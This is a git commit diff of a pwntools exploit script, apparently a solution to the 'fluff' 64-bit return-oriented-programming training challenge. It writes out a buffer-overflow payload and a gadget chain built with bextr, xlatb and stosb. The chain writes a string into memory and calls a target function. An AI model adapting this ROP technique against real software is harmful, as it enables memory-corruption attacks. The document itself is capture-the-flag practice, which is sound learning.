25f0d97a64bd477c0f3460d118da99bd71f675a7
Will <whbogard@protonmail.com>
2021-05-24 13:48:55 -0400

    Figured out how to use bextr

--- fluff/xploitFluff_64.py
+++ fluff/xploitFluff_64.py
@@ -26,7 +26,7 @@ def start(argv=[], *a, **kw):
 # ./exploit.py GDB
 gdbscript = '''
 break main
-break *0x400639
+break *0x40062a
 continue
 '''.format(**locals())
 
@@ -40,23 +40,33 @@ continue
 # PIE:      No PIE (0x400000)
 # RUNPATH:  b'.'
 
-def useLetter(letterAddress):
-    paramJunk = p64(0x0)
-    xlatb = p64(0x400628)  # al = *(ds:bx + zextend(al))
-    stosb = p64(0x400639)  # increments rdi
-    popRbx = p64(0x40069a)
-    chain = popRbx + p64(letterAddress) + paramJunk * 5 + xlatb + stosb
+def useLetter(letterAddress, rdx = 0):
+    xlatb = p64(0x400628)       # al = *(ds:bx + zextend(al))
+    stosb = p64(0x400639)       # increments rdi for byte operation.  Store byte
+                                #   from al to memory location at ES:EDI
+    bextrRdx = p64(0x40062a)    # Roundabout way to write a byte to rbx
+    bextr = p64(0x40062b)       # No pop rdx
+
+    if (rdx):
+        chain = bextrRdx + p64(rdx) + p64(letterAddress - 0x3ef2) + xlatb + stosb
+    else:
+        chain = bextr +  p64(letterAddress - 0x3ef2) + xlatb + stosb
+
     return chain
+
+def setupRdi():
+    popRdi = p64(0x4006a3)
+    dataAddress = p64(0x601028)
+
+    return popRdi + dataAddress
+
 
 io = start()
 
 junk = b'A'*32 + b'B'*8
 
 
-popRdi = p64(0x4006a3)
-dataAddress = p64(0x601028)
-
-payload = junk + popRdi + dataAddress + useLetter(0x4003d7) + useLetter(0x40037e) + useLetter(0x40036a) + useLetter(0x40036e) + useLetter(0x4003cd) + useLetter(0x400657) + useLetter(0x400654) + useLetter(0x400653) + p64(0x400da3) + p64(0x400620)
+payload = junk + setupRdi() + useLetter(0x4003d7, 0xff00) + useLetter(0x40037e) + useLetter(0x40036a) + useLetter(0x40036e) + useLetter(0x4003cd) + useLetter(0x40069d) + useLetter(0x400654) + useLetter(0x400653) + setupRdi() + p64(0x400620)
 
 log.info(io.clean())
 io.sendline(payload)
